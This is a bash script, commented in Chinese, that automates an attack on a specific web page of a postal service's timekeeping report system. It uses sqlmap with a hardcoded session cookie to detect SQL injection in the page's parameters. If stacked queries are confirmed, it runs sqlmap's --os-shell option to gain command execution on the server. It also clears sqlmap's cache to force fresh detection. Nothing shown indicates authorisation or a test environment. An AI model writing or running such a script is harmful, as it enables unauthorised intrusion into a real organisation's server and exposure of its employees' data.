#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"

# 用户提供的完整URL（包含所有参数）
TARGET='http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 使用完整URL（包含所有参数）重新测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "  完整URL: $TARGET"
echo "  Cookie: ASP.NET_SessionId=$SESSION"
echo ""

# 先清除缓存，强制重新检测
rm -rf /root/.local/share/sqlmap/output/vps.vnpost.vn 2>/dev/null
rm -rf ~/.local/share/sqlmap/output/vps.vnpost.vn 2>/dev/null

echo "  [1] 检测SQL注入（包括stacked queries）..."
echo ""

python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --random-agent \
    --threads=1 \
    --delay=1 \
    --timeout=30 \
    --level=2 \
    --risk=2 \
    --technique=BEUST \
    --dbms=mssql \
    --fresh-queries \
    -v 1 \
    2>&1 | tee sqlmap_full_detection.txt

echo ""
echo "  检测结果:"
grep -A 20 "Parameter: kyluong" sqlmap_full_detection.txt | head -30

echo ""
if grep -qi "stacked queries" sqlmap_full_detection.txt; then
    echo "  🔥🔥🔥 确认：支持堆叠查询！"
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🔥 获取os-shell"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        --os-shell \
        -v 0 \
        2>&1 | tee sqlmap_osshell_final.txt
    
    echo ""
    echo "  os-shell结果:"
    cat sqlmap_osshell_final.txt | tail -100
    
else
    echo "  ❌ 未检测到堆叠查询"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 执行完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
